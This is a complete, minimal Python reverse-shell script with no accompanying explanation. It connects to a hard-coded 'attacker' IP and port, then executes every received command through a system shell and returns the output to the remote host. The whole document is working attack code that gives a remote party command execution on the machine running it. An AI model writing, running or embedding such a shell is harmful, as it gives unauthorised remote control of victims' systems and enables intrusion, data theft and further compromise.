import socket
import subprocess
attacker_ip = '10.10.10.10'
attacker_port = 6969
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    # Connect to the attacker's machine
    s.connect((attacker_ip, attacker_port))
    s.send(b'Connection established\n')
except Exception as e:
    print(f"Connection failed: {e}")
    exit(1)
while True:
    command = s.recv(1024).decode('utf-8')
    if command.lower() == 'exit':
        break
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
    except subprocess.CalledProcessError as e:
        output = e.output
    s.send(output)
s.close()
